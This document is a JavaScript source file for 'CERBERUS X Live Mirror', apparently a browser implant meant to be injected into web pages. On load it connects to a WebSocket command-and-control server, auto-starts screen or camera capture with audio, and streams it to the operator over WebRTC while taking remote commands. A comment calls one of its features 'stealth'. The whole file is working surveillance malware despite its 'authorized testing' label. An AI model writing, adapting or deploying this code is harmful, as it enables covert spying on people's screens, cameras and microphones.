/**
 * CERBERUS X - LIVE MIRROR v2.0
 * Advanced Screen + Audio Mirroring with WebRTC
 * 
 * Copyright (c) 2024 F1REW0LF
 * License: MIT - For authorized security testing only
 */

(function() {
    'use strict';
    
    // ==================== CONFIG ====================
    const CONFIG = {
        c2Host: location.host,
        c2Port: 8080,
        videoQuality: {
            width: 1280,
            height: 720,
            frameRate: 30
        },
        audioEnabled: true,
        autoStart: true,
        reconnectInterval: 5000
    };
    
    const WS_URL = `ws://${CONFIG.c2Host}:${CONFIG.c2Port}`;
    let ws = null;
    let peerConnection = null;
    let mediaStream = null;
    let isMirroring = false;
    let reconnectTimer = null;
    
    // ==================== WEB SOCKET ====================
    function connectWebSocket() {
        try {
            ws = new WebSocket(WS_URL);
            
            ws.onopen = () => {
                console.log('[+] WebSocket connected to C2');
                if (CONFIG.autoStart) {
                    startMirroring();
                }
            };
            
            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    handleCommand(data);
                } catch(e) {
                    console.log('[-] Invalid message format');
                }
            };
            
            ws.onclose = () => {
                console.log('[-] WebSocket disconnected');
                scheduleReconnect();
            };
            
            ws.onerror = (error) => {
                console.log('[-] WebSocket error:', error);
            };
            
        } catch(e) {
            console.log('[-] WebSocket connection failed');
            scheduleReconnect();
        }
    }
    
    function scheduleReconnect() {
        if (reconnectTimer) return;
        reconnectTimer = setTimeout(() => {
            reconnectTimer = null;
            connectWebSocket();
        }, CONFIG.reconnectInterval);
    }
    
    // ==================== WEBRTC ====================
    async function startMirroring() {
        if (isMirroring) {
            console.log('[!] Already mirroring');
            return;
        }
        
        try {
            // Get media stream
            const constraints = {
                video: {
                    width: { ideal: CONFIG.videoQuality.width },
                    height: { ideal: CONFIG.videoQuality.height },
                    frameRate: { ideal: CONFIG.videoQuality.frameRate }
                },
                audio: CONFIG.audioEnabled
            };
            
            // Try to get screen capture
            try {
                mediaStream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: CONFIG.audioEnabled
                });
                console.log('[+] Screen capture started');
            } catch(e) {
                // Fallback: get camera
                console.log('[-] Screen capture failed, trying camera...');
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: CONFIG.audioEnabled
                });
                console.log('[+] Camera capture started');
            }
            
            // Create peer connection
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            // Add tracks
            mediaStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, mediaStream);
            });
            
            // Handle ICE candidates
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    sendToC2({
                        type: 'ICE_CANDIDATE',
                        candidate: event.candidate
                    });
                }
            };
            
            // Handle connection state
            peerConnection.onconnectionstatechange = () => {
                const state = peerConnection.connectionState;
                console.log(`[!] Connection state: ${state}`);
                
                if (state === 'connected') {
                    isMirroring = true;
                    sendToC2({
                        type: 'SCREEN_MIRROR',
                        status: 'active',
                        timestamp: Date.now()
                    });
                }
            };
            
            // Create offer
            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            
            sendToC2({
                type: 'WEBRTC_OFFER',
                sdp: offer.sdp,
                timestamp: Date.now()
            });
            
            console.log('[+] Mirroring started');
            
        } catch(e) {
            console.log('[-] Failed to start mirroring:', e);
            sendToC2({
                type: 'SCREEN_MIRROR',
                status: 'failed',
                error: e.message,
                timestamp: Date.now()
            });
        }
    }
    
    function stopMirroring() {
        if (!isMirroring) return;
        
        try {
            // Stop tracks
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            
            // Close peer connection
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            
            isMirroring = false;
            
            sendToC2({
                type: 'SCREEN_MIRROR',
                status: 'stopped',
                timestamp: Date.now()
            });
            
            console.log('[+] Mirroring stopped');
            
        } catch(e) {
            console.log('[-] Error stopping mirroring:', e);
        }
    }
    
    // ==================== COMMANDS ====================
    function handleCommand(data) {
        switch(data.type) {
            case 'START_MIRROR':
                startMirroring();
                break;
                
            case 'STOP_MIRROR':
                stopMirroring();
                break;
                
            case 'TOGGLE_AUDIO':
                CONFIG.audioEnabled = !CONFIG.audioEnabled;
                console.log(`[!] Audio ${CONFIG.audioEnabled ? 'enabled' : 'disabled'}`);
                if (isMirroring) {
                    restartMirroring();
                }
                break;
                
            case 'CHANGE_QUALITY':
                if (data.quality) {
                    CONFIG.videoQuality = {
                        ...CONFIG.videoQuality,
                        ...data.quality
                    };
                    console.log('[!] Quality updated:', CONFIG.videoQuality);
                    if (isMirroring) {
                        restartMirroring();
                    }
                }
                break;
                
            case 'PING':
                sendToC2({ type: 'PONG', timestamp: Date.now() });
                break;
        }
    }
    
    async function restartMirroring() {
        stopMirroring();
        await sleep(1000);
        startMirroring();
    }
    
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // ==================== COMMUNICATION ====================
    function sendToC2(data) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(data));
        }
    }
    
    // ==================== UI CONTROLS ====================
    function createUI() {
        // Check if UI already exists
        if (document.getElementById('cerberus-mirror-ui')) return;
        
        const ui = document.createElement('div');
        ui.id = 'cerberus-mirror-ui';
        ui.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
            background: rgba(0,0,0,0.8);
            color: #00ff41;
            padding: 15px;
            border: 1px solid #00ff41;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            min-width: 200px;
            display: none;
        `;
        
        ui.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;">
                <span style="font-weight:bold;">CERBERUS MIRROR</span>
                <span id="mirror-status" style="color:#666;">OFFLINE</span>
            </div>
            <div style="margin-top:10px;font-size:10px;color:#666;">
                <div>Audio: <span id="audio-status">OFF</span></div>
                <div>FPS: <span id="fps-counter">0</span></div>
                <div>Quality: <span id="quality-info">${CONFIG.videoQuality.width}x${CONFIG.videoQuality.height}</span></div>
            </div>
            <div style="margin-top:10px;display:flex;gap:5px;">
                <button onclick="toggleMirror()" style="background:#00ff41;color:#000;border:none;padding:5px 10px;cursor:pointer;border-radius:3px;">
                    START
                </button>
                <button onclick="toggleAudio()" style="background:#666;color:#fff;border:none;padding:5px 10px;cursor:pointer;border-radius:3px;">
                    AUDIO
                </button>
            </div>
        `;
        
        document.body.appendChild(ui);
        
        // Show UI after a delay (stealth)
        setTimeout(() => {
            ui.style.display = 'block';
        }, 5000);
    }
    
    // Expose functions to global scope for UI
    window.toggleMirror = () => {
        if (isMirroring) {
            stopMirroring();
            document.getElementById('mirror-status').textContent = 'STOPPED';
            document.getElementById('mirror-status').style.color = '#ff003c';
        } else {
            startMirroring();
            document.getElementById('mirror-status').textContent = 'ACTIVE';
            document.getElementById('mirror-status').style.color = '#00ff41';
        }
    };
    
    window.toggleAudio = () => {
        CONFIG.audioEnabled = !CONFIG.audioEnabled;
        document.getElementById('audio-status').textContent = CONFIG.audioEnabled ? 'ON' : 'OFF';
        if (isMirroring) {
            restartMirroring();
        }
    };
    
    // ==================== INIT ====================
    function init() {
        console.log('[+] CERBERUS X - Live Mirror v2.0');
        console.log('[+] C2: ' + WS_URL);
        
        // Connect to C2
        connectWebSocket();
        
        // Create UI
        createUI();
        
        // Update status periodically
        setInterval(() => {
            const statusEl = document.getElementById('mirror-status');
            if (statusEl) {
                statusEl.textContent = isMirroring ? 'ACTIVE' : 'STANDBY';
                statusEl.style.color = isMirroring ? '#00ff41' : '#666';
            }
        }, 1000);
        
        // Auto-start if configured
        if (CONFIG.autoStart) {
            setTimeout(startMirroring, 3000);
        }
    }
    
    // Start when ready
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }
})();
